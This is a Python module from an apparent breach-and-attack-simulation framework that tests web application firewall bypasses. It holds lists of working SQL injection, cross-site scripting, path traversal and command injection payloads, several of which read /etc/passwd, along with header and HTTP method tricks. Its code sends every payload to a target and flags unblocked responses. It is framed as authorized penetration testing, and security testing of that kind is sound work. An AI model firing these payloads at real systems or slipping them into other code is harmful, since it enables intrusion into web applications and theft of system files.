"""
WAF Bypass Testing module.
Tests Web Application Firewall bypass techniques for authorized testing.
MITRE ATT&CK: T1027 - Obfuscated Files or Information

Validates WAF rule effectiveness by testing known bypass patterns.
For authorized penetration testing only.
"""
from __future__ import annotations
import uuid
from typing import Any
from bas.core.executor import AttackRequest, AttackResponse
from bas.core.scope import AuthorizationLevel
from bas.modules.base_module import BaseAttackModule, ModuleMetadata, ModuleResult, VulnStatus

# WAF bypass payloads organized by technique
WAF_BYPASS_PAYLOADS = {
    # SQLi WAF bypass
    "sqli_comment_bypass": [
        "1'/*!50000UNION*//*!50000SELECT*/1,2,3--",
        "1'/**/UNION/**/ALL/**/SELECT/**/1,2,3--",
        "1' UnIoN SeLeCt 1,2,3--",
        "1'||UTL_INADDR.get_host_address((SELECT banner FROM v$version WHERE ROWNUM=1))--",
        "1'%0aUNION%0aSELECT%0a1,2,3--",
        "1'%09UNION%09SELECT%091,2,3--",
    ],
    # XSS WAF bypass
    "xss_encoding_bypass": [
        "<svg/onload=alert`1`>",
        "<img src=x onerror=alert(1)>",
        "<details/open/ontoggle=alert(1)>",
        "'-alert(1)-'",
        "\\u003cscript\\u003ealert(1)\\u003c/script\\u003e",
        "<math><mtext><table><mglyph><svg><mtext><textarea><path d=\"M0\"><img onerror=alert(1) src=x>",
        "<iframe/src=\"data:text/html,<svg onload=alert(1)>\">",
    ],
    # Path traversal WAF bypass
    "lfi_bypass": [
        "....//....//....//etc/passwd",
        "..%252f..%252f..%252fetc/passwd",
        "..%c0%af..%c0%af..%c0%afetc/passwd",
        "/etc/passwd%00.jpg",
        "....\\\\....\\\\etc\\\\passwd",
        "%252e%252e%252fetc%252fpasswd",
    ],
    # Command injection WAF bypass
    "cmdi_bypass": [
        ";{cat,/etc/passwd}",
        "a]||cat${IFS}/etc/passwd",
        "|`cat /etc/passwd`",
        ";cat</etc/passwd",
        "$({cat,/etc/passwd})",
        "a]||cat$IFS/etc$IFS/passwd",
        ";cat${IFS}/etc${IFS}/passwd",
    ],
    # Header-based bypass
    "header_bypass": [
        "X-Forwarded-For: 127.0.0.1",
        "X-Original-URL: /admin",
        "X-Rewrite-URL: /admin",
        "Content-Type: multipart/form-data; boundary=----",
        "Transfer-Encoding: chunked",
    ],
    # HTTP method bypass
    "method_bypass": [
        "TRACE", "TRACK", "DEBUG", "PURGE", "OPTIONS",
    ],
    # Protocol-level bypass
    "protocol_bypass": [
        "HTTP/0.9", "HTTP/1.0",
    ],
}


class WAFBypassModule(BaseAttackModule):
    """Tests WAF bypass techniques for authorized security assessment."""

    @property
    def metadata(self) -> ModuleMetadata:
        return ModuleMetadata(
            name="waf_bypass",
            description="WAF bypass technique testing - validates firewall rules",
            category="evasion",
            mitre_technique_ids=["T1027", "T1190"],
            mitre_technique_names=["Obfuscated Files or Information", "Exploit Public-Facing Application"],
            auth_level_required=AuthorizationLevel.AGGRESSIVE,
            cwe_ids=["CWE-693"],
            tags=["evasion", "waf", "bypass", "firewall"],
        )

    async def _get_payloads(self, target: str, options: dict[str, Any]) -> list[str]:
        categories = options.get("bypass_categories", list(WAF_BYPASS_PAYLOADS.keys()))
        payloads = []
        for cat in categories:
            if cat in WAF_BYPASS_PAYLOADS:
                for p in WAF_BYPASS_PAYLOADS[cat]:
                    payloads.append(f"{cat}|{p}")
        return payloads

    def _build_requests(self, target: str, payloads: list[str], options: dict[str, Any]) -> list[AttackRequest]:
        requests = []
        test_path = options.get("path", "/")
        for payload in payloads:
            cat, value = payload.split("|", 1)
            if cat == "header_bypass":
                key, val = value.split(": ", 1)
                requests.append(AttackRequest(
                    request_id=f"waf-{uuid.uuid4().hex[:8]}",
                    target=target, method="GET", path=test_path,
                    headers={key: val, "X-BAS-Category": cat},
                ))
            elif cat == "method_bypass":
                requests.append(AttackRequest(
                    request_id=f"waf-{uuid.uuid4().hex[:8]}",
                    target=target, method=value, path=test_path,
                    headers={"X-BAS-Category": cat},
                ))
            else:
                param = options.get("param", "q")
                requests.append(AttackRequest(
                    request_id=f"waf-{uuid.uuid4().hex[:8]}",
                    target=target, method="GET",
                    path=f"{test_path}?{param}={value}",
                    headers={"X-BAS-Category": cat, "X-BAS-Payload": value[:50]},
                ))
        return requests

    def _analyze_response(self, request: AttackRequest, response: AttackResponse, payload: str) -> ModuleResult:
        cat = request.headers.get("X-BAS-Category", "unknown")
        body = response.body_text.lower()

        blocked_indicators = ["blocked", "forbidden", "waf", "firewall", "not acceptable", "request denied"]
        is_blocked = response.status_code in (403, 406, 429, 503) or any(i in body for i in blocked_indicators)

        if not is_blocked and response.status_code in (200, 301, 302):
            severity = "critical" if cat in ("sqli_comment_bypass", "cmdi_bypass") else "high"
            return ModuleResult(
                module_name="waf_bypass", target=request.target,
                status=VulnStatus.POTENTIALLY_VULNERABLE,
                payload_used=payload, response_code=response.status_code,
                response_body_preview=response.body_text[:300],
                elapsed_ms=response.elapsed_ms,
                evidence=f"WAF bypass successful (category: {cat}, HTTP {response.status_code})",
                severity=severity, mitre_technique_id="T1027",
                detail={"category": cat, "waf_bypassed": True},
            )
        return ModuleResult(
            module_name="waf_bypass", target=request.target,
            status=VulnStatus.NOT_VULNERABLE, payload_used=payload,
            response_code=response.status_code, elapsed_ms=response.elapsed_ms,
            detail={"category": cat, "waf_bypassed": False},
        )
